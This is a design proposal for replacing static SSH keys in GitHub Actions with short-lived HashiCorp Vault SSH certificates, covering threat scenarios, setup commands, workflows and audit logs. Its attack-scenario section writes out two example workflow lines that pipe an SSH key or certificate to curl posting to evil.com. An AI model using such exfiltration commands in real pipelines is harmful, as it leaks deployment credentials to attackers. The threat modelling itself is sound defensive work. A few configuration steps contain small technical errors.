# Vault SSH Secrets Engine: Security Architecture

**Document Version**: 1.0
**Date**: 2026-01-01
**Author**: Claude-Dev (claude-dev@tamshai.com)
**Status**: PROPOSED - Awaiting Security Review
**Classification**: INTERNAL - Security Architecture

---

## Executive Summary

This document proposes migrating from **static SSH keys stored in GitHub Secrets** to **HashiCorp Vault SSH Secrets Engine** with short-lived certificates. This eliminates long-lived credentials from GitHub, reduces blast radius of compromise, and provides comprehensive audit logging.

**Security Posture Improvement**: HIGH
**Implementation Effort**: MEDIUM (2-3 days)
**Prerequisite**: Vault already deployed (confirmed: `VAULT_ROOT_TOKEN` exists)

---

## Current State: Static SSH Keys

### Architecture

```
┌─────────────────┐     Static SSH Key      ┌─────────────────┐
│  GitHub Actions │ ───────────────────────►│   VPS (Hetzner) │
│                 │   (stored in secrets)   │                 │
│  VPS_SSH_KEY    │                         │  ~/.ssh/        │
│  (never expires)│                         │  authorized_keys│
└─────────────────┘                         └─────────────────┘
```

### Security Risks

| Risk | Severity | Description |
|------|----------|-------------|
| **Static Credentials** | HIGH | SSH key never expires, no automatic rotation |
| **Third-Party Storage** | HIGH | GitHub (Microsoft) stores encrypted key |
| **Workflow Exfiltration** | MEDIUM | Malicious PR could `echo $VPS_SSH_KEY` |
| **No Audit Trail** | MEDIUM | No centralized logging of SSH key usage |
| **Blast Radius** | HIGH | Compromised key = permanent VPS access |
| **Key Sprawl** | LOW | Multiple copies of same key across systems |

### Current Secrets in GitHub

```
STAGING_VAULT_ADDR      ✅ Already configured
VAULT_ROOT_TOKEN        ✅ Already configured (HIGH RISK - should also migrate)
VAULT_UNSEAL_KEY_1-5    ✅ Already configured (HIGH RISK - should also migrate)
VPS_HOST                ❌ Not configured
VPS_USER                ❌ Not configured
VPS_SSH_KEY             ❌ Not configured
```

---

## Proposed State: Vault SSH Secrets Engine

### Architecture

```
┌─────────────────┐                      ┌─────────────────┐
│  GitHub Actions │                      │  HashiCorp      │
│                 │   1. OIDC Token      │  Vault          │
│  (No SSH keys)  │ ───────────────────► │                 │
│                 │                      │  SSH Secrets    │
│                 │   2. Signed Cert     │  Engine         │
│                 │ ◄─────────────────── │                 │
└─────────────────┘   (10 min TTL)       │  Audit Log      │
        │                                └─────────────────┘
        │
        │ 3. SSH with Certificate
        ▼
┌─────────────────┐
│   VPS (Hetzner) │
│                 │
│  TrustedUserCA  │  ← Trusts Vault CA
│  (no static     │
│   authorized_   │
│   keys needed)  │
└─────────────────┘
```

### How It Works

1. **GitHub OIDC Authentication**
   - GitHub Actions requests OIDC token from GitHub
   - Token contains claims: repo, branch, actor, workflow
   - No static credentials stored in GitHub

2. **Vault Issues Short-Lived Certificate**
   - Vault validates OIDC token against GitHub's JWKS
   - Vault signs SSH certificate with 10-minute TTL
   - Certificate includes principal (username), extensions

3. **VPS Trusts Vault CA**
   - VPS sshd configured to trust Vault's CA public key
   - Any certificate signed by Vault CA is accepted
   - No need to manage `authorized_keys` files

4. **Automatic Expiry**
   - Certificate expires after 10 minutes
   - Even if exfiltrated, useless after TTL
   - No rotation required - each deployment gets fresh cert

---

## Security Posture Comparison

### Risk Mitigation Matrix

| Risk | Current (Static Key) | Proposed (Vault SSH) | Improvement |
|------|---------------------|---------------------|-------------|
| **Credential Lifetime** | ∞ (never expires) | 10 minutes | 🟢 99.99% reduction |
| **GitHub Compromise** | Full VPS access | No impact (no keys) | 🟢 Eliminated |
| **Workflow Injection** | Key exfiltration possible | OIDC token useless outside GitHub | 🟢 Eliminated |
| **Audit Trail** | None | Full Vault audit log | 🟢 Complete visibility |
| **Key Rotation** | Manual, rarely done | Automatic every deployment | 🟢 Zero maintenance |
| **Blast Radius** | Permanent access | 10-minute window | 🟢 99.99% reduction |
| **Lateral Movement** | Key reuse across systems | Unique cert per deployment | 🟢 Eliminated |

### Compliance Impact

| Standard | Current Gap | Proposed Solution |
|----------|-------------|-------------------|
| **SOC 2 CC6.1** | Long-lived credentials | Short-lived certificates, audit logging |
| **SOC 2 CC6.2** | No credential rotation | Automatic rotation every deployment |
| **SOC 2 CC7.2** | Limited audit trail | Comprehensive Vault audit logs |
| **NIST 800-53 IA-5** | Static authenticators | Dynamic, time-limited certificates |
| **CIS Controls 5.2** | Shared credentials | Unique per-deployment credentials |

### Attack Scenarios

#### Scenario 1: GitHub Secrets Compromised

**Current (Static Key)**:
- Attacker extracts `VPS_SSH_KEY` from GitHub
- Attacker has permanent SSH access to VPS
- Must rotate key, update all systems, revoke old key
- Detection: Difficult (key looks legitimate)

**Proposed (Vault SSH)**:
- No SSH keys in GitHub to steal
- OIDC tokens only work from GitHub Actions environment
- Attacker cannot generate valid certificates
- Detection: N/A (attack vector eliminated)

#### Scenario 2: Malicious Pull Request

**Current (Static Key)**:
```yaml
# Malicious workflow step
- run: echo "${{ secrets.VPS_SSH_KEY }}" | base64 | curl -X POST https://evil.com/collect
```
- Key exfiltrated, attacker has permanent access

**Proposed (Vault SSH)**:
```yaml
# Malicious workflow step
- run: echo "${{ steps.vault.outputs.ssh_cert }}" | curl -X POST https://evil.com/collect
```
- Certificate exfiltrated, but:
  - Expires in 10 minutes
  - Only valid from GitHub Actions IP range (if configured)
  - Vault audit log shows unusual access pattern
  - Can revoke Vault role immediately

#### Scenario 3: Insider Threat

**Current (Static Key)**:
- Developer with GitHub admin access can view/copy SSH key
- Key works indefinitely from any location
- No audit trail of key access

**Proposed (Vault SSH)**:
- Developer cannot access SSH keys (they don't exist)
- Vault audit log shows all certificate requests
- Certificates only issued for legitimate workflow runs
- Role-based access control in Vault

---

## Implementation Plan

### Phase 1: Vault SSH Secrets Engine Setup (Day 1)

#### 1.1 Enable SSH Secrets Engine

```bash
# SSH to VPS or use existing Vault access
export VAULT_ADDR="https://vault.tamshai.com:8200"
export VAULT_TOKEN="<root-or-admin-token>"

# Enable SSH secrets engine
vault secrets enable -path=ssh-client-signer ssh

# Configure CA for signing
vault write ssh-client-signer/config/ca generate_signing_key=true

# Get CA public key (needed for VPS)
vault read -field=public_key ssh-client-signer/config/ca > vault-ca.pub
```

#### 1.2 Create SSH Role for GitHub Actions

```bash
# Create role for GitHub deployments
vault write ssh-client-signer/roles/github-deploy \
    key_type=ca \
    default_user=tamshai \
    allowed_users="tamshai,root" \
    allowed_extensions="permit-pty,permit-port-forwarding" \
    default_extensions='{"permit-pty": ""}' \
    ttl=10m \
    max_ttl=30m
```

#### 1.3 Configure VPS to Trust Vault CA

```bash
# On VPS: Add Vault CA to trusted CAs
echo "@cert-authority * $(cat vault-ca.pub)" >> /etc/ssh/sshd_config.d/vault-ca.conf

# Or in sshd_config
echo "TrustedUserCAKeys /etc/ssh/vault-ca.pub" >> /etc/ssh/sshd_config

# Reload sshd
systemctl reload sshd
```

### Phase 2: GitHub OIDC Integration (Day 1-2)

#### 2.1 Enable JWT Auth in Vault

```bash
# Enable JWT auth method
vault auth enable jwt

# Configure GitHub OIDC provider
vault write auth/jwt/config \
    bound_issuer="https://token.actions.githubusercontent.com" \
    oidc_discovery_url="https://token.actions.githubusercontent.com"
```

#### 2.2 Create Vault Policy for SSH Signing

```bash
# Create policy
vault policy write github-deploy-ssh - <<EOF
# Allow reading SSH CA public key
path "ssh-client-signer/config/ca" {
  capabilities = ["read"]
}

# Allow signing SSH keys
path "ssh-client-signer/sign/github-deploy" {
  capabilities = ["create", "update"]
}
EOF
```

#### 2.3 Create JWT Role for GitHub Actions

```bash
# Create role bound to specific repo/branch
vault write auth/jwt/role/github-deploy \
    role_type="jwt" \
    bound_audiences="https://github.com/jcornell3" \
    bound_claims_type="glob" \
    bound_claims='{"repository":"jcornell3/tamshai-enterprise-ai","ref":"refs/heads/main"}' \
    user_claim="actor" \
    policies="github-deploy-ssh" \
    ttl=15m
```

### Phase 3: Update GitHub Workflows (Day 2)

#### 3.1 Update Workflow to Use Vault SSH

```yaml
# .github/workflows/deploy-mcp-gateway.yml
name: Deploy MCP Gateway

on:
  push:
    branches: [main]
    paths:
      - 'services/mcp-gateway/**'

permissions:
  id-token: write  # Required for OIDC
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: staging

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Authenticate to Vault via OIDC
        uses: hashicorp/vault-action@v2
        id: vault
        with:
          url: ${{ secrets.VAULT_ADDR }}
          method: jwt
          role: github-deploy
          jwtGithubAudience: https://github.com/jcornell3
          secrets: |
            ssh-client-signer/sign/github-deploy public_key=@~/.ssh/id_ed25519.pub | SSH_SIGNED_KEY

      - name: Setup SSH with Vault Certificate
        run: |
          # Generate ephemeral key pair
          ssh-keygen -t ed25519 -f ~/.ssh/id_ed25519 -N "" -q

          # Sign public key with Vault
          echo "${{ steps.vault.outputs.SSH_SIGNED_KEY }}" > ~/.ssh/id_ed25519-cert.pub
          chmod 600 ~/.ssh/id_ed25519-cert.pub

          # Add VPS to known hosts
          ssh-keyscan -H ${{ secrets.VPS_HOST }} >> ~/.ssh/known_hosts

      - name: Deploy to VPS
        env:
          VPS_HOST: ${{ secrets.VPS_HOST }}
        run: |
          # SSH using certificate (no private key in secrets!)
          ssh -i ~/.ssh/id_ed25519 tamshai@$VPS_HOST << 'EOF'
          cd /opt/tamshai
          git pull origin main
          docker compose -f docker-compose.vps.yml up -d --build mcp-gateway
          EOF
```

#### 3.2 Simplified Secrets Required

After migration, GitHub secrets needed:

| Secret | Purpose | Risk Level |
|--------|---------|------------|
| `VAULT_ADDR` | Vault URL | 🟢 LOW (public endpoint) |
| `VPS_HOST` | VPS IP for ssh-keyscan | 🟢 LOW (IP is public anyway) |

**Removed from GitHub**:
- ❌ `VPS_SSH_KEY` - No longer needed
- ❌ `VPS_USER` - Hardcoded in workflow (or Vault role)

### Phase 4: Audit and Monitoring (Day 3)

#### 4.1 Enable Vault Audit Logging

```bash
# Enable file audit log
vault audit enable file file_path=/var/log/vault/audit.log

# Or enable syslog for centralized logging
vault audit enable syslog tag="vault" facility="AUTH"
```

#### 4.2 Create Alerting Rules

```yaml
# Example Prometheus alert for unusual SSH signing
groups:
  - name: vault-ssh-alerts
    rules:
      - alert: UnusualSSHCertificateVolume
        expr: rate(vault_secret_lease_creation_count{mount="ssh-client-signer"}[5m]) > 10
        for: 5m
        labels:
          severity: warning
        annotations:
          summary: "Unusual SSH certificate issuance rate"

      - alert: SSHCertificateFromUnknownActor
        expr: vault_audit_log{path="ssh-client-signer/sign/github-deploy", actor!~"github-actions.*"} > 0
        for: 1m
        labels:
          severity: critical
        annotations:
          summary: "SSH certificate requested by unknown actor"
```

---

## Security Hardening Options

### Option 1: IP-Based Restrictions (Recommended)

Restrict Vault SSH signing to GitHub Actions IP ranges:

```bash
# Get GitHub Actions IP ranges
curl -s https://api.github.com/meta | jq '.actions'

# Configure Vault role with CIDR restrictions
vault write auth/jwt/role/github-deploy \
    bound_cidrs="140.82.112.0/20,185.199.108.0/22,192.30.252.0/22" \
    # ... other settings
```

**Trade-off**: GitHub IP ranges change; requires periodic updates.

### Option 2: Require Specific Workflow

Bind certificates to specific workflow file:

```bash
vault write auth/jwt/role/github-deploy \
    bound_claims='{"workflow":"deploy-mcp-gateway.yml"}' \
    # ... other settings
```

**Trade-off**: Need separate Vault roles per workflow.

### Option 3: Branch Protection

Only allow certificates for protected branches:

```bash
vault write auth/jwt/role/github-deploy \
    bound_claims='{"ref":"refs/heads/main"}' \
    # ... other settings
```

**Trade-off**: Cannot deploy from feature branches (desired for production).

### Option 4: Environment-Specific Roles

Create separate Vault roles per environment:

```bash
# Staging role (anyone can deploy)
vault write auth/jwt/role/github-deploy-staging \
    bound_claims='{"environment":"staging"}' \
    policies="github-deploy-ssh-staging"

# Production role (requires approval)
vault write auth/jwt/role/github-deploy-production \
    bound_claims='{"environment":"production"}' \
    policies="github-deploy-ssh-production"
```

---

## Migration Path

### Phase 1: Parallel Operation (Week 1)

1. Set up Vault SSH alongside existing static key method
2. Test Vault SSH with non-critical workflow (e.g., `deploy-mcp-support`)
3. Monitor for issues, validate audit logging
4. Keep static key as fallback

### Phase 2: Gradual Migration (Week 2)

1. Migrate remaining deployment workflows one-by-one
2. Validate each workflow in staging environment
3. Update documentation and runbooks
4. Train team on Vault SSH troubleshooting

### Phase 3: Deprecate Static Keys (Week 3)

1. Remove `VPS_SSH_KEY` from GitHub Secrets
2. Remove static key from VPS `authorized_keys`
3. Update security documentation
4. Close migration ticket

### Rollback Plan

If issues occur:
1. Re-add static SSH key to GitHub Secrets
2. Re-add public key to VPS `authorized_keys`
3. Revert workflow changes
4. Investigate Vault SSH issues

---

## Cost-Benefit Analysis

### Costs

| Item | Effort | Notes |
|------|--------|-------|
| Vault SSH Engine setup | 4 hours | One-time configuration |
| GitHub workflow updates | 2 hours | 14 workflows to update |
| VPS SSH configuration | 1 hour | Add CA trust |
| Testing and validation | 4 hours | All workflows, both environments |
| Documentation | 2 hours | Runbooks, troubleshooting |
| **Total** | **~2 days** | Can be done incrementally |

### Benefits

| Benefit | Value |
|---------|-------|
| Eliminate static credential risk | HIGH - Primary security improvement |
| Automatic credential rotation | HIGH - Zero maintenance |
| Comprehensive audit logging | HIGH - Compliance requirement |
| Reduced blast radius | HIGH - 10 min vs infinite |
| GitHub compromise resilience | HIGH - No secrets to steal |
| SOC 2 compliance | MEDIUM - Several controls addressed |

### ROI

- **Break-even**: Immediate (prevents potential breach)
- **Ongoing savings**: No key rotation overhead
- **Compliance value**: Addresses 5+ SOC 2 controls

---

## Appendix A: Vault SSH Troubleshooting

### Common Issues

#### Certificate Rejected by VPS

```bash
# Check certificate validity
ssh-keygen -L -f ~/.ssh/id_ed25519-cert.pub

# Verify VPS trusts CA
grep TrustedUserCAKeys /etc/ssh/sshd_config

# Check sshd logs
journalctl -u sshd -f
```

#### OIDC Authentication Failed

```bash
# Verify GitHub OIDC token claims
# In workflow:
- run: |
    echo "OIDC Token Claims:"
    echo "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" | cut -d. -f2 | base64 -d | jq .

# Verify Vault role binding
vault read auth/jwt/role/github-deploy
```

#### Certificate TTL Expired

```bash
# Check TTL in Vault role
vault read ssh-client-signer/roles/github-deploy

# Increase if needed (max 30m recommended)
vault write ssh-client-signer/roles/github-deploy ttl=15m max_ttl=30m
```

---

## Appendix B: Vault Audit Log Examples

### Successful Certificate Signing

```json
{
  "time": "2026-01-01T10:30:00.000Z",
  "type": "request",
  "auth": {
    "client_token": "hmac-sha256:...",
    "accessor": "hmac-sha256:...",
    "display_name": "jwt-github-actions[bot]",
    "policies": ["default", "github-deploy-ssh"],
    "token_policies": ["default", "github-deploy-ssh"],
    "metadata": {
      "role": "github-deploy",
      "actor": "github-actions[bot]",
      "repository": "jcornell3/tamshai-enterprise-ai",
      "ref": "refs/heads/main",
      "workflow": "deploy-mcp-gateway.yml"
    }
  },
  "request": {
    "id": "abc123",
    "operation": "update",
    "path": "ssh-client-signer/sign/github-deploy",
    "data": {
      "public_key": "ssh-ed25519 AAAA...",
      "valid_principals": "tamshai",
      "ttl": "10m"
    }
  },
  "response": {
    "data": {
      "signed_key": "ssh-ed25519-cert-v01@openssh.com AAAA..."
    }
  }
}
```

### Failed Authentication (Suspicious)

```json
{
  "time": "2026-01-01T10:35:00.000Z",
  "type": "request",
  "auth": {
    "display_name": "jwt-unknown"
  },
  "request": {
    "id": "def456",
    "operation": "update",
    "path": "auth/jwt/login"
  },
  "error": "permission denied: bound claim 'repository' does not match"
}
```

---

## Appendix C: Migration Checklist

### Pre-Migration

- [ ] Vault is accessible from GitHub Actions
- [ ] Vault root/admin token available
- [ ] VPS SSH access working (for CA configuration)
- [ ] Team notified of maintenance window

### Vault Configuration

- [ ] SSH secrets engine enabled
- [ ] CA key pair generated
- [ ] SSH role created (`github-deploy`)
- [ ] JWT auth method enabled
- [ ] GitHub OIDC configured
- [ ] JWT role created with bound claims
- [ ] Audit logging enabled

### VPS Configuration

- [ ] Vault CA public key added to `TrustedUserCAKeys`
- [ ] sshd reloaded
- [ ] Test SSH with Vault certificate

### GitHub Configuration

- [ ] `VAULT_ADDR` secret added
- [ ] `id-token: write` permission added to workflows
- [ ] Workflow updated to use `hashicorp/vault-action`
- [ ] Static SSH steps replaced with Vault SSH steps

### Validation

- [ ] Test deployment to staging
- [ ] Verify Vault audit logs
- [ ] Test rollback workflow
- [ ] Verify certificate expiry behavior

### Cleanup

- [ ] Remove `VPS_SSH_KEY` from GitHub Secrets
- [ ] Remove static public key from VPS
- [ ] Update security documentation
- [ ] Close migration issue

---

## References

- [HashiCorp Vault SSH Secrets Engine](https://developer.hashicorp.com/vault/docs/secrets/ssh)
- [GitHub OIDC with Vault](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/configuring-openid-connect-in-hashicorp-vault)
- [Vault Audit Devices](https://developer.hashicorp.com/vault/docs/audit)
- [SSH Certificate Authentication](https://man.openbsd.org/ssh-keygen#CERTIFICATES)

---

**Document Owner**: Security Team
**Review Required By**: Project Sponsor, DevOps Lead
**Next Review Date**: 2026-02-01

---

## Approval

| Role | Name | Date | Signature |
|------|------|------|-----------|
| Security Lead | | | |
| DevOps Lead | | | |
| Project Sponsor | | | |
